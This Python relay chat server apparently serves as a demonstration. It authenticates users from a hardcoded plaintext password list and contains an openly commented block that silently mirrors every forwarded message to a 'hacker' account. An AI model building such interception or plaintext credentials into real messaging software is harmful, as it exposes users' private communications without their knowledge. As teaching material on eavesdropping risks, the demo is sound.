# server.py
import socket
import threading
import json

HOST = "0.0.0.0"
PORT = 9000

# Simple demo user database (for demonstration only)
USERS = {
    "alice": "alicepass",
    "bob": "bobpass",
    "hacker": "hackpass"
}

# Connected clients: username -> conn
clients = {}
lock = threading.Lock()


def safe_remove_conn(conn_to_remove):
    """Remove a connection from clients dict (if present)."""
    with lock:
        for uname, c in list(clients.items()):
            if c == conn_to_remove:
                try:
                    del clients[uname]
                except KeyError:
                    pass
                print(f"[-] {uname} disconnected")


def client_handler(conn, addr):
    try:
        # Expect initial auth JSON
        raw = conn.recv(4096)
        if not raw:
            conn.close()
            return
        try:
            auth = json.loads(raw.decode())
        except Exception:
            try:
                conn.sendall(json.dumps({"status": "fail", "reason": "bad_auth_format"}).encode())
            except Exception:
                pass
            conn.close()
            return

        username = auth.get("username")
        password = auth.get("password")
        if username not in USERS or USERS[username] != password:
            try:
                conn.sendall(json.dumps({"status": "fail", "reason": "auth_failed"}).encode())
            except Exception:
                pass
            conn.close()
            return

        # auth ok
        try:
            conn.sendall(json.dumps({"status": "ok"}).encode())
        except Exception:
            conn.close()
            return

        with lock:
            clients[username] = conn
        print(f"[+] {username} authenticated from {addr}")

        # Main loop: receive routing meta then payload and forward
        while True:
            data = conn.recv(65536)
            if not data:
                break

            # Expect routing meta as JSON text
            try:
                meta = json.loads(data.decode())
            except Exception:
                # could be stray bytes; ignore and continue
                continue

            mtype = meta.get("type")
            if mtype == "ROUTE":
                dst = meta.get("dst")
                plen = int(meta.get("len", 0))
                # receive payload bytes
                payload = b''
                while len(payload) < plen:
                    chunk = conn.recv(plen - len(payload))
                    if not chunk:
                        break
                    payload += chunk

                # forward to destination (opaque forwarding)
                with lock:
                    if dst in clients:
                        dst_conn = clients[dst]
                        try:
                            dst_conn.sendall(json.dumps(meta).encode())
                            dst_conn.sendall(payload)
                        except Exception:
                            # destination send failed -> remove it
                            try:
                                dst_conn.close()
                            except Exception:
                                pass
                            # remove mapping
                            for k, v in list(clients.items()):
                                if v == dst_conn:
                                    del clients[k]
                                    print(f"[-] {k} disconnected (during forward)")
                    else:
                        # destination offline; notify sender
                        try:
                            conn.sendall(json.dumps({"status": "fail", "reason": "destination_offline"}).encode())
                        except Exception:
                            pass

                # --- MIRROR TO HACKER (if connected and hacker is not the destination) ---
                with lock:
                    hacker_conn = clients.get('hacker')
                    if hacker_conn and dst != 'hacker' and hacker_conn is not clients.get(dst):
                        try:
                            hacker_conn.sendall(json.dumps(meta).encode())
                            hacker_conn.sendall(payload)
                        except Exception:
                            # if mirror fails, ignore (hacker might have disconnected)
                            pass

            elif mtype == "LOGOUT":
                print(f"[{username}] requested logout")
                break
            else:
                # ignore other meta types
                pass

    except Exception as e:
        print("Client handler exception:", e)
    finally:
        # cleanup on disconnect
        safe_remove_conn(conn)
        try:
            conn.close()
        except Exception:
            pass


def main():
    print("Starting relay server on", HOST, PORT)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    try:
        while True:
            conn, addr = s.accept()
            threading.Thread(target=client_handler, args=(conn, addr), daemon=True).start()
    except KeyboardInterrupt:
        print("Server shutting down")
    finally:
        s.close()


if __name__ == "__main__":
    main()
